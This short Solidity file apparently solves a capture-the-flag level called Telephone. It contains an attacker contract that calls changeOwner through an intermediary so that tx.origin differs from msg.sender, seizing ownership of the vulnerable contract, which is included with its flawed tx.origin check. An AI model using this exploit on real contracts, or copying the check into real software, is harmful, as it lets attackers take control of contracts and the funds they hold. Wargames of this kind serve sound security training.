// Get ownership of the Telephone contract

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Telephone private immutable tele;

    constructor(address _tele) {
        tele = Telephone(_tele);
    }

    function callChangeOwner(address _newOwner) external {
        tele.changeOwner(_newOwner);
    }
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
